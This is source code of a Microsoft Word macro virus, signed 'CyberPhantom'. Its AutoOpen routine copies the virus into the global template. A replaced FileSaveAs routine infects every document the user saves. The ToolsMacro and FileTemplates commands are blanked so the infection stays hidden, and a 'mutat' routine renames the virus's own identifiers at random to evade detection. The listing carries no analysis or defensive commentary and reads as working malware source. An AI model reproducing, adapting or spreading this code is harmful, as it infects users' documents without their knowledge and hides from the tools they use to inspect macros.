   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoopen"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.ToolsMacro Name:="autoopen", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="FileSaveAs", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="XXXXX", Show:=1, Delete:=1
   WordBasic.AppMinimize
   WordBasic.ToolsMacro Name:="autoopen", Edit:=1, Show:=3
   WordBasic.StartOfDocument
   WordBasic.EndOfDocument 1
   WordBasic.EditCopy
   WordBasic.DocClose
   WordBasic.ToolsMacro Name:="XXXXX", Show:=1, Edit:=1
   WordBasic.StartOfDocument
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   WordBasic.ToolsMacro Name:="XXXXX", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 35
   WordBasic.LineDown 9, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   WordBasic.ToolsMacro Name:="FileSaveAs", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   mutat
   Payld
   stlth
   WordBasic.AppRestore
   End Sub

   Private Sub FlSvA()
   Dim FlNm$
   Dim FlMcr$
   Dim fldg_ As Object: Set fldg_ = WordBasic.DialogRecord.FileSaveAs(False)
   Set fldg_ = WordBasic.CurValues.FileSaveAs
   WordBasic.Dialog.FileSaveAs fldg_
   If fldg_.Format = 0 Then fldg_.Format = 1
   FlNm$ = WordBasic.[FileName$]()
   FlMcr$ = FlNm$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:XXXXX", FlMcr$
   WordBasic.FileSaveAs fldg_
   End Sub

   Private Function Rndnm$()
   Dim count_
   Dim rndnx
   Dim rndnx_$
   For count_ = 1 To 5
      rndnx = WordBasic.Int(Rnd() * (90 - 65) + 65)
      rndnx_$ = rndnx_$ + Chr(rndnx)
   Next count_
   Rndnm$ = rndnx_$
   End Function

   Private Sub Payld()
   Dim Rndnm_
   Rndnm_ = WordBasic.Int(Rnd() * (51 - 1) + 1)
   If Rndnm_ = 50 Then WordBasic.MsgBox "Greetings to: CyberDragon, CyberMonk, CyberBard, CyberSage, CyberTeck, CyberHawk, CyberBeef, CyberLich, CyberKnight.  From: CyberPhantom"
   End Sub

   Private Sub mutat()
   Dim dnatx$
   WordBasic.ToolsMacro Name:="XXXXX", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   dnatx$ = WordBasic.[GetText$](606, 611) 'mutat
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](648, 653) 'FlSvA
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](658, 663) '_fldg
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](612, 617) 'Payld
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](869, 874) 'Rndnm
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](880, 885) 'count
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](1299, 1304) 'dnatx
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   WordBasic.DocClose 1
   End Sub

   Private Sub stlth()
   WordBasic.ToolsMacro Name:="XXXXX", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 123
   WordBasic.LineDown 2, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="XXXXX", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 127
   WordBasic.LineDown 2, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   WordBasic.ToolsMacro Name:="FileTemplates", Edit:=1, Show:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   End Sub

   Private Sub TlsMc()
   'No Macro
   End Sub

   Private Sub FlTpt()
   'No Macro
   End Sub
